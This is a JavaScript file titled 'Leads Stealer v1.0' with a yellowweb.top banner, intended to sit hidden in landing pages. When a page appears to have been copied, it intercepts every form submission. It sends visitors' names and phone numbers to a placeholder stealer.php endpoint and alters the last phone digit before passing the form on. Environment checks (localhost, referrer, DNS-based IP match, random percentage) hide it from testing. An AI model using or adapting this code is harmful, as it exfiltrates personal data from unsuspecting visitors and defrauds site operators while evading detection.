//
//
//                        Leads Stealer v1.0\n";
//    _            __     __  _ _             __          __  _     
//   | |           \ \   / / | | |            \ \        / / | |    
//   | |__  _   _   \ \_/ /__| | | _____      _\ \  /\  / /__| |__  
//   | '_ \| | | |   \   / _ \ | |/ _ \ \ /\ / /\ \/  \/ / _ \ '_ \ 
//   | |_) | |_| |    | |  __/ | | (_) \ V  V /  \  /\  /  __/ |_) |
//   |_.__/ \__, |    |_|\___|_|_|\___/ \_/\_/    \/  \/ \___|_.__/ 
//           __/ |        https://yellowweb.top                                              
//          |___/                                                   

let stlr_s = {
    checkLocalhost:true, //Should we check, if we are on localhost, default - true
    checkReferrer:true, //Should we check, if there is a referrer, default - true
    checkHost:false, //Should we check, if our current host is the same as origHost
    checkIp:true, //Should we check, if our current host's ip is the same as origIp
    percent:50, //Percent of leads that will be stolen
    origIp:'XX.XXX.XXX.XXX', //Original Ip of our own host
    origHost:'xxx.com', //Original Host
    php:'https://xxx.com/landings/stealer.php', //Full path to php script that saves leads. For example: https://xxx.com/landings/stealer.php
    debug:false, //When true logs messages to browser's console, default - false
    debugChecks:false, //Should we checkEnvironment in debug mode or not, default - false
    clickApiKey:"" //Keitaro's Click Api v3 key. If you add it, you'll have a subid and all stolen leads will be visible in your tracker.
};

document.addEventListener('DOMContentLoaded', stlr_process);

async function stlr_process(){
    let envOK = await stlr_checkEnvironment();
    if (!envOK) return;

    let forms = document.querySelectorAll('form');
    stlr_log("Found "+forms.length+" forms!");
    for (let form of forms){
        let stlr_form = stlr_cloneForm(form);
        stlr_log("Cloned form and removed action...");
        form.addEventListener('submit', function(evt) {
            evt.preventDefault();
            stlr_addSubmitHandler(evt,stlr_form);
        }, true);
    }
}

function stlr_cloneForm(form){
    let fakeForm = form.cloneNode(true);
    fakeForm.style.display = 'none';
    let body = document.querySelector('body');
    body.append(fakeForm);
    form.removeAttribute('action');
    return fakeForm;
}

async function stlr_addSubmitHandler(e, fakeForm){
    let name = e.target.querySelector('[name="name"]').value;
    let phone = e.target.querySelector('[name="phone"]').value;
    let data = {
        host: window.location.href,
        name: name,
        phone: phone
    };

    if(stlr_s.clickApiKey!=''){
        let capiResp = await fetch("http://"+stlr_s.origHost+"/click_api/v3?token="+stlr_s.clickApiKey+"&info=1&log=1");
        let capiJson = await capiResp.json();
        stlr_log(JSON.stringify(capiJson));
        data.subid = capiJson.info.sub_id;
        stlr_log("Got subid:"+data.subid);
    }

    var formBody = [];
    for (var property in data) {
      var encodedKey = encodeURIComponent(property);
      var encodedValue = encodeURIComponent(data[property]);
      formBody.push(encodedKey + "=" + encodedValue);
    }
    formBody = formBody.join("&");

    let resp = await fetch(stlr_s.php, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' }, body: formBody});
    let lastDigit = phone[phone.length-1];
    let newLastDigit='';
    do{
        newLastDigit=Math.floor(Math.random() * 9);
    }while (lastDigit==newLastDigit);
    phone = `${phone.slice(0, -1)}${newLastDigit}`;
    fakeForm.querySelector('[name="name"]').value = name;
    fakeForm.querySelector('[name="phone"]').value = phone;
    fakeForm.submit();
}

async function stlr_checkEnvironment(){
    if (stlr_s.debug && !stlr_s.debugChecks){
        stlr_log("DEBUG mode is ON and checks are OFF!");
        return true;
    } 

    if (stlr_s.checkLocalhost && (window.location.host.includes('localhost') || window.location.host.includes('127.0.0.1') || window.location.protocol=='file:')){
        stlr_log("This script won't run on localhost!");
        return false;
    } 

    if (stlr_s.checkReferrer && document.referrer == ''){
        stlr_log("No referer found! Exiting...");
        return false;
    } 

    if (stlr_s.checkHost && window.location.host == stlr_s.origHost){
        stlr_log("This promo is NOT stolen! Host is the same.");
        return false;
    } 

    if (stlr_s.checkIp && window.location.host !=''){
        let resp = await fetch('https://cloudflare-dns.com/dns-query?name='+window.location.host+'&type=A',{method: 'GET', headers: { 'Accept': 'application/dns-json' }});
        let json = await resp.json();
        for (let a of json.Answer){
            if (a.data == stlr_s.origIp){
                stlr_log("This promo is NOT stolen! IP is the same.");
                return false;
            }
        }
    } 

    let rnd = Math.floor(Math.random() * 101);
    stlr_log("Current random:"+rnd);
    if (rnd > stlr_s.percent){
        stlr_log("Random is NOT in our favour!");
        return false;
    }
    else
        stlr_log("Random IS in our favour!");

    return true;
}

function stlr_log(msg){
    if (!stlr_s.debug) return;
    console.log(msg);
}